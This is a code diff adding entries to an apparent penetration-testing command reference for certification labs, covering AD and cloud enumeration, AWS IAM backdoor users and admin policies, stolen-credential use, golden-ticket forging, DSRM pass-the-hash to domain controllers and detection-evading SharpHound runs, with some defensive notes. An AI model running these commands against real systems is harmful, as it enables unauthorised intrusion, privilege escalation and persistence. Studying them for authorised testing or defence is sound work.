@@ -1940,7 +1940,7 @@ const COMMAND_DATA = {
           "rel": "next"
         }
       ],
-      "notes": "AD module is pre-installed on DCs and RSAT machines. Load on regular machines: Import-Module ActiveDirectory",
+      "notes": "AD module is pre-installed on DCs and RSAT machines. Install RSAT on non-DC: Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online. LDAP matching rules: 1.2.840.113556.1.4.803 (bitwise AND — check if UAC flag is set), 1.2.840.113556.1.4.804 (bitwise OR — check if any flag in mask is set), 1.2.840.113556.1.4.1941 (LDAP_MATCHING_RULE_IN_CHAIN — recursive memberOf/member resolution for nested groups).",
       "references": [
         {
           "title": "CRTP - AD Module Enumeration",
@@ -1980,6 +1980,22 @@ const COMMAND_DATA = {
         {
           "label": "Forest / global catalogs",
           "command": "Get-ADForest | select Name,RootDomain,Domains,GlobalCatalogs"
+        },
+        {
+          "label": "LDAP recursive memberOf (nested group resolution via 1.2.840.113556.1.4.1941)",
+          "command": "Get-ADGroup -LDAPFilter '(member:1.2.840.113556.1.4.1941:=<user_DN>)' | select Name"
+        },
+        {
+          "label": "LDAP recursive members of a group (1941)",
+          "command": "Get-ADUser -LDAPFilter '(memberOf:1.2.840.113556.1.4.1941:=<group_DN>)'"
+        },
+        {
+          "label": "LDAP bitwise OR filter (1.2.840.113556.1.4.804)",
+          "command": "Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.804:=<bitmask>)'"
+        },
+        {
+          "label": "Ping sweep via AD Module",
+          "command": "Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}"
         }
       ]
     },
@@ -4697,6 +4713,16 @@ const COMMAND_DATA = {
           "command": "aws --profile attacker s3 ls <bucket_name>\n# AccessDenied = exists but private; NoSuchBucket = does not exist"
         }
       ],
+      "variations": [
+        {
+          "label": "List all EC2 instances in the account",
+          "command": "aws --profile <profile> ec2 describe-instances"
+        },
+        {
+          "label": "EC2 instances with public IPs only",
+          "command": "aws --profile <profile> ec2 describe-instances --query \"Reservations[].Instances[?PublicIpAddress].{Id:InstanceId,IP:PublicIpAddress,State:State.Name}\" --output table"
+        }
+      ],
       "notes": "S3 bucket ACLs: 'public' means s3:ListBucket is granted to AllUsers or AuthenticatedUsers. A 403 on aws s3 ls means the bucket exists but you lack permission (still confirms the bucket name). A NoSuchBucket error means it truly doesn't exist. EC2 AMIs: --executable-users all returns AMIs that are publicly available (Public=true). --executable-users self returns AMIs the current account owns and can launch. EBS snapshots with --executable-users all list publicly shared snapshots — attackers can create a volume from them and mount in their own account. describe-images with no filter returns thousands of results; always filter by name/description/keyword. Public AMIs may contain hard-coded credentials, SSH keys, or other sensitive data embedded in the image.",
       "references": [
         {
@@ -4803,6 +4829,10 @@ const COMMAND_DATA = {
         {
           "label": "List customer-managed policies (only attached ones)",
           "command": "aws --profile target iam list-policies --scope Local --only-attached | tee policies.json"
+        },
+        {
+          "label": "List all IAM roles",
+          "command": "aws --profile target iam list-roles | tee roles.json"
         },
         {
           "label": "JMESPath - extract all usernames as a flat list",
@@ -4943,6 +4973,40 @@ const COMMAND_DATA = {
           "command": "aws --profile target iam get-policy-version --policy-arn <arn> --version-id <v> | grep '\"iam\"'"
         }
       ],
+      "variations": [
+        {
+          "label": "List all IAM users",
+          "command": "aws --profile <profile> iam list-users"
+        },
+        {
+          "label": "List all IAM roles",
+          "command": "aws --profile <profile> iam list-roles"
+        },
+        {
+          "label": "List all IAM policies",
+          "command": "aws --profile <profile> iam list-policies --scope Local --only-attached"
+        },
+        {
+          "label": "Get group members",
+          "command": "aws --profile <profile> iam get-group --group-name <group_name>"
+        },
+        {
+          "label": "Get managed policy details",
+          "command": "aws --profile <profile> iam get-policy --policy-arn <policy_arn>"
+        },
+        {
+          "label": "Scope a role's permissions (managed + inline)",
+          "command": "aws --profile <profile> iam list-attached-role-policies --role-name <role_name>\naws --profile <profile> iam list-role-policies --role-name <role_name>\naws --profile <profile> iam get-role-policy --role-name <role_name> --policy-name <policy_name>"
+        },
+        {
+          "label": "Read inline policy on a user / group",
+          "command": "aws --profile <profile> iam get-user-policy --user-name <user> --policy-name <policy_name>\naws --profile <profile> iam get-group-policy --group-name <group> --policy-name <policy_name>"
+        },
+        {
+          "label": "List all managed policy versions",
+          "command": "aws --profile <profile> iam list-policy-versions --policy-arn <policy_arn>"
+        }
+      ],
       "notes": "IAM permissions can come from: (1) inline user policy, (2) managed policy directly attached to user, (3) group membership -> group inline or managed policies, (4) resource-based policies on services (S3, Lambda, etc.), (5) permission boundaries. Permission boundaries RESTRICT the maximum effective permissions — a boundary that allows only S3 means even if a policy grants EC2 access, the user cannot use EC2. Explicit Deny always overrides Allow regardless of source. AWS-managed policies (arn:aws:iam::aws:policy/) can be read via get-policy-version even by the subject user — they are public. Customer-managed policies (arn:aws:iam::<account_id>:policy/) require iam:GetPolicyVersion which may not be granted. Workaround: use get-account-authorization-details (see aws-iam-full-dump) if broader read permissions exist.",
       "references": [
         {
@@ -5065,6 +5129,16 @@ const COMMAND_DATA = {
         {
           "label": "Alternative persistence - create inline policy with full access",
           "command": "aws --profile <profile> iam put-user-policy --user-name backdoor \\\n  --policy-name admin-access \\\n  --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'"
+        }
+      ],
+      "variations": [
+        {
+          "label": "Attach admin policy to a role (role-based privesc)",
+          "command": "aws --profile <profile> iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name <role_name>"
+        },
+        {
+          "label": "Create login profile (console password) for backdoor user",
+          "command": "aws --profile <profile> iam create-login-profile --user-name backdoor --password <password>"
         }
       ],
       "notes": "The AdministratorAccess AWS managed policy ARN (arn:aws:iam::aws:policy/AdministratorAccess) is the same across all AWS accounts. This grants full access to all AWS services and resources. The SecretAccessKey is ONLY returned in the create-access-key response — AWS never shows it again. If lost, delete the access key and create a new one. Alternative: iam:CreateLoginProfile creates a console password (not access keys). Alternative: iam:PutUserPolicy / iam:AttachUserPolicy on a low-privilege existing user silently escalates without creating a new detectable user. CloudTrail logs all IAM API calls — iam:CreateUser, iam:AttachUserPolicy, and iam:CreateAccessKey appear in the audit trail. Defenders look for unusual iam:Create* calls, especially outside business hours or from unexpected source IPs.",
@@ -5328,6 +5402,24 @@ const COMMAND_DATA = {
         {
           "label": "List services that have been enumerated this session",
           "command": "Pacu (offseclab:imported-target) > services"
+        }
+      ],
+      "variations": [
+        {
+          "label": "set_keys (configure temp creds directly in Pacu)",
+          "command": "Pacu (offseclab:No Keys Set) > set_keys"
+        },
+        {
+          "label": "Enumerate EC2 instances and view results",
+          "command": "Pacu (offseclab:imported-target) > run ec2__enum\nPacu (offseclab:imported-target) > data EC2"
+        },
+        {
+          "label": "Scan for IAM privilege escalation paths",
+          "command": "Pacu (offseclab:imported-target) > run iam__privesc_scan"
+        },
+        {
+          "label": "Check current identity and permissions summary",
+          "command": "Pacu (offseclab:imported-target) > whoami"
         }
       ],
       "notes": "Pacu organizes data by AWS service (IAM, EC2, S3, etc.) in its SQLite database — use 'data IAM' or 'data EC2' to view collected data. Sessions persist across runs — re-running Pacu reconnects to the last session or you can activate a specific one with --activate-session. import_keys reads from the local ~/.aws/credentials file (aws configure profiles). The iam__enum_roles module works cross-account by attempting to update the AssumeRole trust policy of a role you control — if a role exists in the target account, the update succeeds. iam__enum_permissions uses a brute-force approach calling hundreds of AWS APIs and tracking which succeed vs. return AccessDenied. iam__bruteforce_permissions is a more aggressive alternative for permission discovery. Useful Pacu modules for Ch24-25: iam__enum_*, ec2__enum, s3__*, lambda__enum, rds__enum, ebs__enum_volumes_snapshots.",
@@ -5817,6 +5909,16 @@ const COMMAND_DATA = {
           "command": "sudo apt update && sudo apt install -y awscli"
         }
       ],
+      "variations": [
+        {
+          "label": "Configure stolen short-term (STS) credentials manually",
+          "command": "aws configure set aws_access_key_id <key_id> --profile <profile>\naws configure set aws_secret_access_key <secret> --profile <profile>\naws configure set aws_session_token <token> --profile <profile>\naws sts get-caller-identity --profile <profile>"
+        },
+        {
+          "label": "Stored credentials file location",
+          "command": "# Windows: C:\\Users\\<user>\\.aws\\credentials\n# Linux: /home/<user>/.aws/credentials\ncat ~/.aws/credentials"
+        }
+      ],
       "notes": "Access Key IDs starting with AKIA are long-term credentials (IAM user keys). AKIDs starting with ASIA are temporary STS credentials (from AssumeRole or instance metadata). The account ID is 12 digits and appears in the ARN as the 5th colon-separated segment: arn:aws:iam::<account_id>:user/<name>. sts get-access-key-info only requires a valid AWS profile (even your own attacker account) and returns the account ID the target AKID belongs to — useful for mapping which company/account a leaked key came from. Credentials are stored in ~/.aws/credentials (keys) and ~/.aws/config (region/output). Multiple profiles can coexist; switch with --profile.",
       "references": [
         {
@@ -6228,6 +6330,28 @@ const COMMAND_DATA = {
         {
           "label": "Role definitions (permissions per role)",
           "command": "az role definition list -n <RoleName>\naz role definition list --custom-role-only"
+        }
+      ],
+      "variations": [
+        {
+          "label": "List all VMs in the subscription",
+          "command": "az vm list -o table"
+        },
+        {
+          "label": "Get VM public IP address",
+          "command": "az vm list-ip-addresses --name <vm_name> --resource-group <rg_name> -o table"
+        },
+        {
+          "label": "Role assignments in a specific subscription",
+          "command": "az role assignment list --subscription <subscription_id_or_name>"
+        },
+        {
+          "label": "All role assignments (current subscription + inherited)",
+          "command": "az role assignment list --all"
+        },
+        {
+          "label": "Subscription detail by ID or name",
+          "command": "az account show -s <subscription_id_or_name>"
         }
       ],
       "notes": "ARM hierarchy: Tenant -> Management Group -> Subscription -> Resource Group -> Resource; RBAC role assignments inherit top-down. Built-in roles: Owner (full + can assign roles), Contributor (full but NOT role assignment), Reader (read-only), plus custom roles. Hunt for: your principal's assignments (--assignee), custom roles with dangerous actions, and Owner / User Access Administrator to escalate by assigning yourself a role. ARM REST base: https://management.azure.com/{version}/{resource}?{query}.",
@@ -6920,6 +7044,10 @@ const COMMAND_DATA = {
           "command": "Invoke-BloodHound -CollectionMethod DCOnly -OutputDirectory C:\\Temp\\"
         },
         {
+          "label": "SharpHound stealth (exclude DCs to avoid MDI)",
+          "command": "SharpHound.exe --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets,CertServices --excludedcs"
+        },
+        {
           "label": "Run as alternate user",
           "command": "Invoke-BloodHound -CollectionMethod All -LdapUsername <user> -LdapPassword '<password>'"
         }
@@ -6946,7 +7074,7 @@ const COMMAND_DATA = {
           "rel": "alternative"
         }
       ],
-      "notes": "Key BH queries: 'Shortest Paths to Domain Admins', 'Computers with Unconstrained Delegation', 'Find Principals with DCSync Rights'. SOAPHound collects BloodHound-compatible data over AD Web Services (ADWS, TCP 9389) instead of raw LDAP - much stealthier than SharpHound. Build a cache first, then --bhdump.",
+      "notes": "Key BH queries: 'Shortest Paths to Domain Admins', 'Computers with Unconstrained Delegation', 'Find Principals with DCSync Rights'. Use --excludedcs to avoid MDI detection on DCs. Drop noisy methods (RDP, DCOM, PSRemote, LocalAdmin) for stealth — they connect to every host. LDAP-only methods (Group, GPOLocalGroup, Trusts, ACL, Container, ObjectProps, SPNTargets) are stealthiest. SOAPHound collects via ADWS (TCP 9389) instead of raw LDAP — stealthier. Build a cache first, then --bhdump.",
       "references": [
         {
           "title": "CRTP - BloodHound/SharpHound",
@@ -6970,6 +7098,14 @@ const COMMAND_DATA = {
         "secure_config": "# Restrict SAMR enumeration:\nSet-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RestrictRemoteSam -Value 'O:BAG:BAD:(A;;RC;;;BA)'\n\n# Via GPO:\n# Computer Config → Windows Settings → Security Settings → Local Policies → Security Options\n# → Network access: Restrict clients allowed to make remote calls to SAM\n\n# Remediate dangerous ACEs:\nRemove-ADPermission -Identity 'DomainAdmin1' -User 'HelpDesk' -AccessRights GenericAll\n\n# WDAC: deny SharpHound.exe by hash"
       },
       "variations": [
+        {
+          "label": "SharpHound CE (Community Edition)",
+          "command": "SharpHound.exe --collectionmethods All"
+        },
+        {
+          "label": "SharpHound Legacy",
+          "command": "SharpHound.exe --collectionmethods All"
+        },
         {
           "label": "SOAPHound - build cache (ADWS, stealthy)",
           "command": "SOAPHound.exe --buildcache -c <cache_file>"
@@ -11961,6 +12097,10 @@ const COMMAND_DATA = {
         {
           "label": "Null session",
           "command": "crackmapexec smb <dc_ip> -u '' -p '' --pass-pol"
+        },
+        {
+          "label": "PowerView — Get-DomainPolicy (password policy from LDAP)",
+          "command": "Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess"
         }
       ]
     },
@@ -19089,12 +19229,20 @@ const COMMAND_DATA = {
           "command": "SafetyKatz.exe \"lsadump::lsa /patch\" \"exit\""
         },
         {
-          "label": "Enable DSRM network logon (run on DC)",
+          "label": "Enable DSRM network logon (run on DC via winrs)",
           "command": "New-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\' -Name 'DsrmAdminLogonBehavior' -Value 2 -PropertyType DWORD"
         },
         {
-          "label": "PTH with DSRM hash to DC",
+          "label": "PTH with DSRM hash (spawns new process)",
           "command": "SafetyKatz.exe \"sekurlsa::pth /domain:<dc_host> /user:Administrator /ntlm:<nt_hash> /run:powershell.exe\" \"exit\""
+        },
+        {
+          "label": "Add DC IP to TrustedHosts (from new process)",
+          "command": "Set-Item WSMan:\\localhost\\Client\\TrustedHosts <dc_ip>"
+        },
+        {
+          "label": "Connect to DC using injected DSRM creds",
+          "command": "Enter-PSSession -ComputerName <dc_ip> -Authentication NegotiateWithImplicitCredential"
         }
       ],
       "examples": [
@@ -19133,7 +19281,7 @@ const COMMAND_DATA = {
           "note": "Continue enumeration/technique in this area"
         }
       ],
-      "notes": "DSRM hash doesn't change with AD password resets. Registry value 2 persists across reboots. Detectable via registry monitoring at HKLM\\System\\...\\Lsa.",
+      "notes": "DSRM hash doesn't change with AD password resets. Registry value 2 persists across reboots. Must use DC IP (not hostname) to force NTLM auth — hostname goes through Kerberos which won't work for local accounts. Use -Authentication NegotiateWithImplicitCredential to use the injected DSRM creds from the PTH process. Detectable via registry monitoring at HKLM\\System\\...\\Lsa.",
       "references": [
         {
           "title": "CRTP - DSRM Backdoor",
@@ -20244,6 +20392,20 @@ const COMMAND_DATA = {
         {
           "label": "Microsoft Graph app roles",
           "command": "$res = Get-MgServicePrincipal -Filter \"DisplayName eq 'Microsoft Graph'\"; $res.AppRoles | Where-Object {$_.Id -eq '<AppRoleID>'} | ConvertTo-Json"
+        }
+      ],
+      "variations": [
+        {
+          "label": "Filter users by display name",
+          "command": "Get-MgUser -Filter \"startswith(displayName,'<prefix>')\" | ConvertTo-Json"
+        },
+        {
+          "label": "List service principals assigned to a directory role",
+          "command": "Get-MgDirectoryRoleMemberAsServicePrincipal -DirectoryRoleId <role_id> | ConvertTo-Json"
+        },
+        {
+          "label": "App delegated (OAuth2) permissions",
+          "command": "$app = Get-MgApplication -ApplicationId <app_obj_id>\n$app.Oauth2RequirePostResponse | ConvertTo-Json"
         }
       ],
       "notes": "Every Entra object has a unique objectId. Objects: Users, Groups (security/dynamic/M365), Devices (AAD-joined/hybrid/registered), Applications (+ service principals + managed identities). Directory roles = Entra admin roles (Global Admin, Application Admin, User Admin...) - distinct from ARM RBAC roles. getuserrealm.srf tells you (unauthenticated) whether a domain is Managed (Entra) or Federated. Enumerate app RequiredResourceAccess / OAuth2 permissions to find over-privileged apps to abuse.",
@@ -24815,6 +24977,12 @@ const COMMAND_DATA = {
           "command": "gcloud <cmd> --impersonate-service-account <target_sa_email>\ngcloud iam service-accounts keys create key.json --iam-account <target_sa_email>"
         }
       ],
+      "variations": [
+        {
+          "label": "Automated enumeration with gcp_enum script",
+          "command": "./gcp_enum.sh"
+        }
+      ],
       "notes": "GCP privesc is about specific dangerous permissions rather than a single 'admin' flag. High-value primitives: iam.serviceAccounts.getAccessToken / iam.serviceAccounts.actAs / iam.serviceAccounts.implicitDelegation (impersonate a more-privileged SA), iam.serviceAccountKeys.create (mint a key for a better SA), iam.roles.update (add permissions to a role you can edit), *.setIamPolicy (bind yourself a better role), deploymentmanager.deployments.create + cloudfunctions/compute (run as a privileged SA), cloudbuild. RhinoSecurityLabs GCP-IAM-Privilege-Escalation automates enumeration (enumerate_member_permissions.py) and detection/exploitation (check_for_privesc.py + exploit_scripts/*). Manual path: gcloud iam service-accounts get-iam-policy to find SAs you can actAs, then --impersonate-service-account or keys create.",
       "references": [
         {
@@ -25743,7 +25911,11 @@ const COMMAND_DATA = {
           "command": "Get-DomainSID"
         },
         {
-          "label": "Forge golden ticket",
+          "label": "Auto-generate OPSEC forge command (queries LDAP for real PAC values)",
+          "command": "Rubeus.exe golden /aes256:<krbtgt_aes256_key> /sid:<domain_sid> /ldap /user:Administrator /printcmd"
+        },
+        {
+          "label": "Forge golden ticket (use output from /printcmd or manual)",
           "command": "Rubeus.exe golden /rc4:<nt_hash> /domain:<domain> /sid:<domain_sid> /user:Administrator /ptt"
         },
         {
@@ -35974,6 +36146,14 @@ const COMMAND_DATA = {
         "secure_config": "# Restrict WinRM source IPs via GPO firewall rule:\nNew-NetFirewallRule -DisplayName 'WinRM from PAW only' -Direction Inbound -Protocol TCP -LocalPort 5985,5986 -RemoteAddress 10.0.100.0/24 -Action Allow\nNew-NetFirewallRule -DisplayName 'Block WinRM from workstations' -Direction Inbound -Protocol TCP -LocalPort 5985,5986 -RemoteAddress 10.0.0.0/8 -Action Block\n\n# JEA endpoint — restrict what DA accounts can run remotely:\nNew-PSSessionConfigurationFile -Path 'C:\\JEA\\DomainAdminJEA.pssc' -SessionType RestrictedRemoteServer -RoleDefinitions @{'CORP\\Domain Admins' = @{RoleCapabilities = 'DomainAdminCaps'}}\nRegister-PSSessionConfiguration -Path 'C:\\JEA\\DomainAdminJEA.pssc' -Name 'DomainAdminJEA' -Force\n\n# SIEM alert:\n# EventID=4688 AND NewProcessName contains 'wsmprovhost.exe' AND\n# SubjectUserName in (DA accounts) AND Computer NOT IN (known servers) → ALERT"
       },
       "variations": [
+        {
+          "label": "New-PSSession (persistent reusable session)",
+          "command": "$sess = New-PSSession -ComputerName <host>\nEnter-PSSession -Session $sess"
+        },
+        {
+          "label": "Invoke-Command via saved session",
+          "command": "Invoke-Command -Session $sess -ScriptBlock { whoami }"
+        },
         {
           "label": "Discover where you have PSRemoting admin",
           "command": "Find-PSRemotingLocalAdminAccess -Domain <domain> -Verbose"
@@ -54628,6 +54808,125 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "ad-pingcastle",
+      "name": "PingCastle - AD Security Posture Assessment",
+      "command": "PingCastle.exe --healthcheck",
+      "description": "Evaluates the security posture of an Active Directory environment and produces a scored report based on the Capability Maturity Model Integration (CMMI) framework. The healthcheck mode assesses misconfigurations, vulnerability susceptibility, delegation issues, share permissions, and trust configurations. The scanner menu offers targeted checks: null sessions, LAPS/BitLocker status, SMB version, spooler service, ZeroLogon, local admin enumeration, and ACL issues.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Enumeration",
+      "subcategory": "Miscellaneous Misconfigurations",
+      "certifications": [
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "CPTS Module 13: Active Directory Enumeration & Attacks",
+      "tags": [
+        "active-directory",
+        "audit",
+        "security-posture",
+        "cmmi",
+        "misconfiguration",
+        "reporting"
+      ],
+      "mitre": [
+        "T1087.002",
+        "T1069.002"
+      ],
+      "exam": "exam-ok",
+      "tools": [
+        "PingCastle"
+      ],
+      "examples": [
+        {
+          "label": "View help menu",
+          "command": "PingCastle.exe --help"
+        },
+        {
+          "label": "Interactive mode (presents TUI menu)",
+          "command": "PingCastle.exe"
+        },
+        {
+          "label": "Run healthcheck (default — scored risk assessment)",
+          "command": "PingCastle.exe --healthcheck"
+        },
+        {
+          "label": "Target a specific DC",
+          "command": "PingCastle.exe --healthcheck --server ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL"
+        },
+        {
+          "label": "Healthcheck all domains via trusts",
+          "command": "PingCastle.exe --healthcheck --server *.forest"
+        },
+        {
+          "label": "Run a specific scanner (e.g. localadmin, smb, spooler, zerologon)",
+          "command": "PingCastle.exe --scanner localadmin"
+        },
+        {
+          "label": "Aggregate multiple healthcheck reports",
+          "command": "PingCastle.exe --conso"
+        },
+        {
+          "label": "Build a map of interconnected domains",
+          "command": "PingCastle.exe --carto"
+        }
+      ],
+      "variations": [
+        {
+          "label": "Scanner options available via interactive TUI",
+          "command": "# 1-aclcheck  2-antivirus  3-computerversion  4-foreignusers\n# 5-laps_bitlocker  6-localadmin  7-nullsession  8-nullsession-trust\n# 9-oxidbindings  a-remote  b-share  c-smb  d-smb3querynetwork\n# e-spooler  f-startup  g-zerologon"
+        },
+        {
+          "label": "Export users or computers",
+          "command": "PingCastle.exe --export"
+        }
+      ],
+      "notes": "PingCastle produces an HTML report with risk scores across four categories: Stale Objects, Privileged Accounts, Trust Relationships, and Anomalies. Each category gets a 0-100 score (lower is better). The scanner modes provide targeted checks useful during both attack and reporting phases. The localadmin scanner enumerates which accounts have local admin on machines. The spooler scanner identifies hosts with Print Spooler enabled (PrintNightmare/Printer Bug targets). The zerologon scanner tests for CVE-2020-1472 susceptibility. Requires only a domain-joined host and any domain user credential. Reports can be aggregated across multiple domains with --conso for enterprise-wide assessments.",
+      "references": [
+        {
+          "title": "PingCastle Documentation",
+          "url": "https://www.pingcastle.com/documentation/"
+        },
+        {
+          "title": "PingCastle Download",
+          "url": "https://www.pingcastle.com/"
+        },
+        {
+          "title": "HTB Academy - Active Directory Enumeration & Attacks",
+          "url": "https://academy.hackthebox.com/module/details/143"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-group3r",
+          "rel": "alternative",
+          "note": "Group3r focuses specifically on GPO misconfigurations; PingCastle covers broader AD security posture."
+        },
+        {
+          "id": "ad-neo4j-bloodhound",
+          "rel": "alternative",
+          "note": "BloodHound maps attack paths graphically; PingCastle provides scored risk assessment for reporting."
+        }
+      ],
+      "defense": {
+        "why_it_works": "PingCastle reads AD objects, attributes, and configurations accessible to any authenticated domain user. Its value is in automated analysis — correlating misconfigurations, scoring risk, and presenting findings in a defensible framework. Attackers use it to quickly identify the highest-value misconfigurations; defenders use it to track security posture over time.",
+        "prerequisites": "Domain-joined Windows host with any valid domain user credentials. Network access to a domain controller (LDAP/ADWS).",
+        "impact": "T1087.002 Account Discovery: Domain Account + T1069.002 Permission Groups Discovery: Domain Groups. Comprehensive map of AD security weaknesses including stale objects, privileged account exposure, dangerous trust configurations, and anomalies.",
+        "detection": "LDAP and ADWS queries from workstations. PingCastle generates multiple queries across users, groups, trusts, and GPOs — similar traffic pattern to BloodHound but lower volume. Defender for Identity may flag reconnaissance activity.",
+        "artifacts": "LDAP/ADWS query logs on DCs. HTML report files on the running host.",
+        "prevention": "PingCastle reads data available to all authenticated users by design. Focus on fixing the issues it reports: remove stale accounts, enforce least privilege on privileged groups, review trust configurations, remediate anomalies.",
+        "evasion": "Run from a legitimate admin workstation during business hours. PingCastle is a legitimate security tool often used by defenders — its traffic pattern is less suspicious than custom scripts.",
+        "sources": [
+          "HTB M13",
+          "https://attack.mitre.org/techniques/T1087/002/"
+        ],
+        "misconfiguration": "Stale user/computer accounts, excessive privileged group membership, misconfigured trusts, GPO weaknesses, missing LAPS deployment, disabled SMB signing, enabled Print Spooler on DCs.",
+        "vulnerable_config": "# PingCastle healthcheck reveals common issues:\n# - Domain Admins group has 15 members (should be <5)\n# - 200 stale computer accounts (no logon in 90+ days)\n# - Forest trust with SID filtering disabled\n# - SMB signing not required on DCs",
+        "secure_config": "# Address PingCastle findings:\n# 1. Reduce DA membership to minimum required\n# 2. Disable/remove stale accounts (Get-ADComputer -Filter {LastLogonDate -lt (Get-Date).AddDays(-90)})\n# 3. Enable SID filtering on all trusts\n# 4. Require SMB signing (GPO: Microsoft network server: Digitally sign communications (always) = Enabled)\n# 5. Run PingCastle quarterly to track improvement scores"
+      }
+    },
+    {
       "id": "ping-sweep",
       "name": "Pivot - Host Discovery Ping Sweep",
       "command": "for i in {1..254}; do (ping -c 1 172.16.5.$i | grep \"bytes from\" &); done",
@@ -56508,6 +56807,10 @@ const COMMAND_DATA = {
         {
           "label": "Who has rights over Domain Admins",
           "command": "Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs -Verbose"
+        },
+        {
+          "label": "Set-DomainObjectOwner — WriteOwner abuse (take ownership, then WriteDACL)",
+          "command": "Set-DomainObjectOwner -Identity <target> -OwnerIdentity <attacker> -Credential $Cred"
         }
       ],
       "steps": [
@@ -57929,6 +58232,18 @@ const COMMAND_DATA = {
         {
           "label": "Across a host list",
           "command": "Get-DomainComputer | %{ Test-AdminAccess -ComputerName $_.dnshostname }"
+        },
+        {
+          "label": "Get-NetLocalGroupMember — enumerate local Administrators on a remote host",
+          "command": "Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName Administrators"
+        },
+        {
+          "label": "Get-NetLocalGroupMember — check Remote Desktop Users",
+          "command": "Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Desktop Users\""
+        },
+        {
+          "label": "Get-NetLocalGroupMember — check Remote Management Users (WinRM access)",
+          "command": "Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Management Users\""
         }
       ],
       "steps": [
@@ -58028,7 +58343,17 @@ const COMMAND_DATA = {
         "misconfiguration": "GenericAll/GenericWrite ACE on DA accounts/GPOs/DCs granted to non-admin groups. WriteDACL on domain object allows self-granting DCSync rights. Legacy admin delegation never cleaned up.",
         "vulnerable_config": "# Dangerous ACE — HelpDesk has GenericAll on a DA account:\nGet-ObjectAcl 'DomainAdmin1' -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'GenericAll'}\n# Output: CORP\\HelpDesk — GenericAll → can reset DA password\n\n# WriteDACL on domain object:\nGet-ObjectAcl 'DC=corp,DC=local' -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'WriteDacl'}",
         "secure_config": "# Remove dangerous ACE:\nRemove-ADPermission -Identity 'DomainAdmin1' -User 'HelpDesk' -AccessRights GenericAll\n\n# Enable AD object auditing via GPO:\n# Computer Config → Windows Settings → Security Settings → Advanced Audit Policy\n# → DS Access → Audit Directory Service Changes: Success,Failure\n# Event 5136 fires on every AD object modification\n\n# Quarterly BloodHound ACL audit:\n# Query: 'Find Principals with DCSync Rights' / 'Find Dangerous Rights for Domain Users'"
-      }
+      },
+      "variations": [
+        {
+          "label": "ConvertTo-SID (name to SID)",
+          "command": "ConvertTo-SID '<domain>\\<user>'"
+        },
+        {
+          "label": "Convert-SidToName (SID to readable name)",
+          "command": "Convert-SidToName <sid>"
+        }
+      ]
     },
     {
       "id": "crtp-powerview-domain",
@@ -58337,6 +58662,10 @@ const COMMAND_DATA = {
         {
           "label": "Forest + child domains",
           "command": "Get-ForestDomain"
+        },
+        {
+          "label": "Resolve-IPAddress (hostname to IP)",
+          "command": "Resolve-IPAddress -ComputerName <host>"
         }
       ],
       "examples": [
@@ -58520,6 +58849,10 @@ const COMMAND_DATA = {
         {
           "label": "Forest trusts (external/forest)",
           "command": "Get-ForestTrust -Forest <forest>"
+        },
+        {
+          "label": "Get-DomainTrustMapping (recursive full trust map)",
+          "command": "Get-DomainTrustMapping"
         }
       ]
     },
@@ -58646,6 +58979,18 @@ const COMMAND_DATA = {
         {
           "label": "Last user logged on to a host",
           "command": "Get-LastLoggedOn -ComputerName <host>"
+        },
+        {
+          "label": "Find-LocalAdminAccess (machines where current user is admin)",
+          "command": "Find-LocalAdminAccess"
+        },
+        {
+          "label": "Test-AdminAccess (test admin on a specific host)",
+          "command": "Test-AdminAccess -ComputerName <host>"
+        },
+        {
+          "label": "Get-NetLocalGroup (local groups on a machine)",
+          "command": "Get-NetLocalGroup -ComputerName <host>"
         }
       ]
     },
@@ -58681,6 +59026,18 @@ const COMMAND_DATA = {
       ],
       "steps": [
         {
+          "label": "List all domain groups",
+          "command": "Get-DomainGroup | select Name"
+        },
+        {
+          "label": "Get specific group properties",
+          "command": "Get-DomainGroup -Identity 'Domain Admins'"
+        },
+        {
+          "label": "Get all domain computers",
+          "command": "Get-DomainComputer | select dnshostname,operatingsystem"
+        },
+        {
           "label": "Get all admincount users",
           "command": "Get-DomainUser -AdminCount | select samaccountname,memberof"
         },
@@ -58698,6 +59055,26 @@ const COMMAND_DATA = {
         }
       ],
       "examples": [
+        {
+          "label": "List all computers with OS",
+          "command": "Get-DomainComputer -Properties dnshostname,operatingsystem | select dnshostname,operatingsystem"
+        },
+        {
+          "label": "Filter servers by OS version",
+          "command": "Get-DomainComputer -OperatingSystem '*Server 2022*' | select dnshostname"
+        },
+        {
+          "label": "Computers in a specific OU",
+          "command": "Get-DomainComputer -SearchBase 'OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local' | select dnshostname"
+        },
+        {
+          "label": "List all domain groups with descriptions",
+          "command": "Get-DomainGroup | select Name,Description"
+        },
+        {
+          "label": "Groups containing 'admin' in name",
+          "command": "Get-DomainGroup *admin* | select Name"
+        },
         {
           "label": "List all privileged users (admincount=1)",
           "command": "Get-DomainUser -AdminCount | select samaccountname,description"
@@ -58762,12 +59139,24 @@ const COMMAND_DATA = {
       },
       "variations": [
         {
+          "label": "Get-DomainComputer full properties",
+          "command": "Get-DomainComputer -Properties * | select dnshostname,operatingsystem,lastlogontimestamp"
+        },
+        {
+          "label": "Get-NetComputerSiteName (AD site for a machine)",
+          "command": "Get-NetComputerSiteName -ComputerName <host>"
+        },
+        {
           "label": "Get-DomainManagedSecurityGroup (managed-by set)",
